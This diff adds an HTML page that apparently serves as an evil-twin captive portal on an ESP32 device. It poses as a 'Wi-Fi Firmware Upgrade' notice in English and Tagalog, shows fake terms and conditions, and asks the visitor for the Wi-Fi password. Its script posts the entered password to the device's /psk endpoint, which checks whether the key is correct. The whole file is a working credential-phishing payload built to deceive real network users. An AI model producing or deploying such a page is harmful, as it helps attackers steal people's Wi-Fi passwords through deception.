@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Firmware Upgrade</title>
+    <style>
+      body {
+        min-width: 100vw;
+        min-height: 100vh;
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+      }
+      .topNav {
+        background: royalblue;
+        overflow: hidden;
+        border: 1px solid black;
+        border-radius: 3px;
+      }
+      .topNav a {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 0.9rem 1rem;
+        text-decoration: none;
+        font-size: 1em;
+        letter-spacing: 1px;
+        cursor: pointer;
+      }
+      h1 {
+        text-align: center;
+        margin-top: 3rem;
+        margin-bottom: 0.5rem;
+        font-weight: normal;
+        color: royalblue;
+      }
+      .mainDiv {
+        width: 100vw;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+      h3 {
+        font-weight: normal;
+        width: 85vw;
+        color: #333;
+        margin-bottom: 0.5rem;
+      }
+      textarea {
+        width: 85vw;
+        height: 20vh;
+        padding: 0.5rem;
+        margin-left: 1rem;
+        font-family: Arial, sans-serif;
+        background: #eee;
+        border: 1px solid #cecece;
+        color: #4d4d4d;
+        border-radius: 3px;
+      }
+      h4 {
+        width: 85vw;
+        color: #333;
+        margin-bottom: 0.5rem;
+      }
+      .passwordInput {
+        width: 85vw;
+        padding: 0.5rem;
+        margin-left: 1rem;
+      }
+      @media (max-width: 500px) {
+        .topNav a {
+          letter-spacing: 0;
+          padding: 0.7rem 0.8rem;
+        }
+      }
+      .errorText {
+        visibility: visible;
+        width: 85vw;
+        margin: 0;
+        padding: 0;
+        margin-top: 0.25rem;
+        font-size: 0.8em;
+        color: red;
+      }
+      .invisibleErrorText {
+        visibility: collapse;
+      }
+      button {
+        background-color: royalblue;
+        border: 0;
+        border-radius: 5px;
+        padding: 0.9rem 1.5rem;
+        font-size: 1em;
+        color: white;
+        margin-top: 1rem;
+        margin-bottom: 1rem;
+        cursor: pointer;
+      }
+      .resultText {
+        visibility: hidden;
+      }
+      .resultTextShowSuccess {
+        visibility: visible;
+        width: 85vw;
+        margin: 0;
+        padding: 0;
+        color: green;
+        font-weight: bold;
+        margin-bottom: 1rem;
+      }
+      .resultTextShowError {
+        visibility: visible;
+        width: 85vw;
+        margin: 0;
+        padding: 0;
+        color: red;
+        font-weight: bold;
+        margin-bottom: 1rem;
+      }
+    </style>
+  </head>
+  <body>
+    <nav class="topNav">
+      <a>Status</a>
+      <a>Network</a>
+      <a>Security</a>
+      <a>Admin</a>
+    </nav>
+    <h1>Wi-Fi Firmware Upgrade</h1>
+    <div class="mainDiv">
+      <h3>
+        Wi-Fi is temporarily down due to new firmware upgrade and is awaiting
+        installation. Please review our new terms and conditions and proceed.
+      </h3>
+      <h3>
+        Ang Wi-Fi ay pansamantalang hindi magamit dahil sa bagong firmware
+        upgrade. Mangyaring suriin ang aming bagong mga tuntunin at kundisyon at
+        magpatuloy. Ilagay ang iyong Wi-Fi password at i-click ang "Upgrade
+        Firmware" button.
+      </h3>
+      <h4>Terms And Condition:</h4>
+      <textarea>
+1. ACCEPTANCE OF TERMS 
+By proceeding with the firmware upgrade ("Upgrade"), you agree to be bound by these terms and conditions ("Terms"). If you do not agree to these Terms, please refrain from initiating the Upgrade.
+2. LICENSE GRANT
+Upon completion of the Upgrade, we grant you a non-exclusive, non-transferable license to use the upgraded firmware solely for the purpose of operating the device for which the Upgrade was intended.
+3. FIRMWARE OWNERSHIP
+The firmware and any accompanying materials are owned by the company, and by upgrading, you do not acquire any ownership rights.
+4. CONDITIONS OF USE
+You agree not to reverse engineer, de compile, disassemble, or otherwise attempt to derive the source code of the upgraded firmware. Unauthorized use or reproduction of the firmware is strictly prohibited.
+5. WARRANTY DISCLAIMER
+The Upgrade is provided "as is" without warranty of any kind, either expressed or implied. The company disclaims all warranties, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement.
+6. LIMITATION OF LIABILITY
+In no event shall the company be liable for any direct, indirect, incidental, special, exemplary, or consequential damages (including, but not limited to, procurement of substitute goods or services, loss of use, data, or profits, or business interruption) arising in any way out of the use of the upgraded firmware.
+7. DATA BACKUP
+Before initiating the Upgrade, it is your responsibility to back up all data on the device. The company is not liable for any loss of data during the Upgrade process.
+8. MODIFICATION OF TERMS
+The company reserves the right to modify these Terms at any time. Notification of changes will be provided on our website. Continued use of the upgraded firmware constitutes acceptance of the modified Terms.
+9. TERMINATION
+The company may terminate this license at any time if you fail to comply with these Terms. Upon termination, you must cease using the upgraded firmware.
+10. GOVERNING LAW
+These Terms shall be governed by and construed in accordance with the laws of your jurisdiction.
+        </textarea
+      >
+      <label style="width: 85vw; margin-top: 1rem; color: #333">
+        <input
+          type="checkbox"
+          style="margin: 0"
+          id="termsAndConditionCheckBox"
+        />
+        I Agree With Above Terms And Conditions
+      </label>
+      <p id="agreeTermsAndConditionText" class="invisibleErrorText">
+        *Please agree to the terms and conditions
+      </p>
+      <h4>Password:</h4>
+      <input type="password" id="passwordInput" class="passwordInput" />
+      <p id="passwordErrorText" class="invisibleErrorText">
+        *Password is incorrect
+      </p>
+      <div style="width: 85vw">
+        <button onclick="validatePassword()" id="startUpgradeBtn">
+          Start Upgrade
+        </button>
+      </div>
+      <p class="resultText" id="resultText">
+        UPGRADING FIRMWARE, YOU CAN NOW CLOSE THIS WINDOW
+      </p>
+    </div>
+  </body>
+  <script>
+    const passEmpty = "*Password cannot be empty";
+    const passNotMatch = "*Password does not match";
+    const passWrong = "*Incorrect password";
+    let startUpgrade = document.getElementById("startUpgradeBtn");
+    let password = document.getElementById("passwordInput");
+    let termsAndConditionError = document.getElementById(
+      "agreeTermsAndConditionText"
+    );
+    let passwordError = document.getElementById("passwordErrorText");
+    let resultText = document.getElementById("resultText");
+    function validatePassword() {
+      if (startUpgrade.disabled) {
+        return;
+      }
+      // * INPUT VALIDATION
+      if (!document.getElementById("termsAndConditionCheckBox").checked) {
+        termsAndConditionError.setAttribute("class", "errorText");
+        return;
+      }
+      termsAndConditionError.setAttribute("class", "invisibleErrorText");
+      if (password.value.length == 0) {
+        passwordError.setAttribute("class", "errorText");
+        passwordError.textContent = passEmpty;
+        return;
+      }
+      passwordError.setAttribute("class", "invisibleErrorText");
+      // * SEND THE INPUT TO THE ESP32 WEB SERVER
+      fetch("/psk", {
+        method: "POST",
+        body: JSON.stringify({
+          psk: password.value,
+        }),
+        headers: {
+          "Content-type": "application/json; charset=UTF-8",
+        },
+      })
+        .then((response) => response.text())
+        .then((data) => {
+          let str = data.substring(0, data.length - 1);
+          let result = JSON.parse(str);
+          startUpgrade.disable = true;
+          if (result.success == "y") {
+            // * INPUTTED PASSWORD IS CORRECT
+            resultText.setAttribute("class", "resultTextShowSuccess");
+          } else if (result.success == "n") {
+            // * INPUTTED PASSWORD IS INCORRECT
+            resultText.setAttribute("class", "resultTextShowError");
+            resultText.innerText = "WRONG PASSWORD!";
+          }
+        });
+    }
+  </script>
+</html>
